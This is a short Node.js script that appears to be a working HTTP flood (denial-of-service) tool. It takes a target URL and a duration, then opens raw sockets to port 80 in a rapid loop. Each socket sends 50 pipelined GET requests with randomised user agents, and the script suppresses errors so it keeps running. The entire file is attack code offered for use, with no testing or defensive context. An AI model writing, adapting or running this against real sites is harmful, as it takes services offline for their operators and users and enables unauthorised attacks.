const fs = require('fs');
const url = require('url');
const net = require('net');
if (process.argv.length <= 2) {
	console.log("Usage: node rand.js <url> <time>");
	console.log("Usage: node rand.js <http://example.com> <60>");
	process.exit(-1);
}
var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var time = process.argv[3];

process.on('uncaughtException', function (e) {
    console.warn(e);
});

process.on('unhandledRejection', function (e) {
    console.warn(e);
});

// Load user agents from file
const UAs = fs.readFileSync('useragents.txt', 'utf-8').split('\n').filter(Boolean);

var int = setInterval(() => {
    var s = require('net').Socket();
    s.connect(80, host);
    s.setTimeout(10000);
    for (var i = 0; i < 50; i++) {
        s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 5000);
    })
});
setTimeout(() => clearInterval(int), time * 1000);